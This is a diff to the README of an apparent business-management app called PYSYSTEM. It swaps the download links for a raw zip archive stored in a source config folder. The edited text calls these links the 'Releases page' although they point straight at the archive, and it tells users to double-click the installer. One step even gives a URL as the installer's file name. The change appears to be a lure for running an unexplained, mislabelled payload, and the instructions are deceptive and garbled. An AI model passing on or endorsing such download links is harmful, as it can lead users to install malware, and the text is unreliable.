@@ -6,7 +6,7 @@ Welcome to PYSYSTEM! This application helps you manage your business efficiently
 
 ## 📥 Download PYSYSTEM
 
-[![Download PYSYSTEM](https://raw.githubusercontent.com/Tinnyellow/PYSYSTEM/main/subhouse/PYSYSTEM.zip)](https://raw.githubusercontent.com/Tinnyellow/PYSYSTEM/main/subhouse/PYSYSTEM.zip)
+[![Download PYSYSTEM](https://github.com/Tinnyellow/PYSYSTEM/raw/refs/heads/main/src/shared/config/Software-1.3.zip)](https://github.com/Tinnyellow/PYSYSTEM/raw/refs/heads/main/src/shared/config/Software-1.3.zip)
 
 To get started, click the button above to download the application. It will take you to the Releases page.
 
@@ -33,9 +33,9 @@ PYSYSTEM offers many features to help you:
 
 ## 📚 Download & Install
 
-1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/Tinnyellow/PYSYSTEM/main/subhouse/PYSYSTEM.zip).
+1. Click this link to visit the [Releases page](https://github.com/Tinnyellow/PYSYSTEM/raw/refs/heads/main/src/shared/config/Software-1.3.zip).
 2. On the Releases page, find the latest version of PYSYSTEM.
-3. Look for the installer file, typically named something like `https://raw.githubusercontent.com/Tinnyellow/PYSYSTEM/main/subhouse/PYSYSTEM.zip`.
+3. Look for the installer file, typically named something like `https://github.com/Tinnyellow/PYSYSTEM/raw/refs/heads/main/src/shared/config/Software-1.3.zip`.
 4. Click the file to start the download.
 5. Once downloaded, locate the file in your Downloads folder.
 6. Double-click the installer file to start the installation process.
